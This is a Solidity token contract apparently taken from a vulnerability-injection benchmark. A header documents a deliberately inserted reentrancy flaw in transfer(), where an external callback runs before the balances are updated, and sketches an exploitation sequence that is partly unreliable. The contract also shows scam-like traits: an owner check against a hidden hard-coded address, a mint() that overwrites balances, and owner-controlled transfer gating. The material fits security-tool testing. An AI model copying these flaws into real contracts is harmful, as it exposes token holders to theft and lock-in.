/*
 * ===== SmartInject Injection Details =====
 * Function      : transfer
 * Vulnerability : Reentrancy
 * Status        : Verified
 * Type          : Function Modification
 *
 * === Verification Results ===
 * Detected      : True
 * Relevant      : 2 findings
 * Total Found   : 2 issues
 * Retry Count   : 0
 *
 * === Detected Issues ===
 * 1. reentrancy-no-eth (SWC-107)
 * 2. reentrancy-events (SWC-107)
 *
 * === Description ===
 * Introduced a stateful, multi-transaction reentrancy vulnerability by:
 * 
 * 1. **Added State Tracking**: Introduced `activeTransfers` mapping to track ongoing transfers - this creates persistent state between transactions
 * 2. **Violates Checks-Effects-Interactions**: Added external call (`ITokenReceiver(_to).onTokenReceived`) before updating balances, allowing reentrancy during the call
 * 3. **State Dependency**: The vulnerability requires multiple transactions because the attacker needs to:
 *    - Transaction 1: Deploy malicious contract and fund accounts
 *    - Transaction 2: Call transfer() which triggers the external call, allowing re-entrance
 *    - During re-entrance: The malicious contract can call transfer() again while the original call's state updates haven't completed
 * 
 * **Multi-Transaction Exploitation Process:**
 * 
 * **Transaction 1 (Setup):**
 * - Attacker deploys malicious contract implementing ITokenReceiver
 * - Funds attacker's account with tokens
 * - Sets up recipient contract
 * 
 * **Transaction 2 (Exploitation):**
 * - Attacker calls transfer() to malicious contract
 * - transfer() calls external onTokenReceived() on malicious contract
 * - Malicious contract re-enters transfer() during the callback
 * - Since balance updates haven't happened yet, the re-entrant call passes balance checks
 * - Attacker can drain more tokens than they should be able to
 * 
 * **Why Multi-Transaction is Required:**
 * - The vulnerability depends on the sequence: setup → trigger → re-enter
 * - State changes (activeTransfers flag) persist between calls
 * - The external call creates a window where state is inconsistent
 * - Cannot be exploited in a single transaction because the attacker needs to have the malicious contract deployed and ready to receive the callback
 * 
 * This creates a realistic reentrancy vulnerability that requires careful orchestration across multiple transactions, making it suitable for advanced security analysis tools.
 */
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

// Interface for recipient contract to receive tokens
interface ITokenReceiver {
    function onTokenReceived(address from, uint256 value) external;
}

contract FireTokenAndreKP9R is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
  }
  
  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;

  // Added missing mapping declaration
  mapping(address => bool) public activeTransfers;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
    // First transaction: Mark as active transfer for recipient
    if (activeTransfers[_to] == false) {
        activeTransfers[_to] = true;
    }
    
    // External call to recipient before state updates - vulnerable to reentrancy
    uint length;
    assembly {length := extcodesize(_to)}
    if (length > 0) {
        ITokenReceiver(_to).onTokenReceived(msg.sender, _value);
    }
    
    // State updates happen after external call - can be exploited if re-entered
    // ===== SMARTINJECT: Reentrancy VULNERABILITY END =====
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    // ===== SMARTINJECT: Reentrancy VULNERABILITY START =====
    
    // Clean up active transfer flag
    activeTransfers[_to] = false;
    
    // ===== SMARTINJECT: Reentrancy VULNERABILITY END =====
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  modifier onlyOwner() {
    require(msg.sender == address(1080614020421183795110940285280029773222128095634));_;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
  
  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}
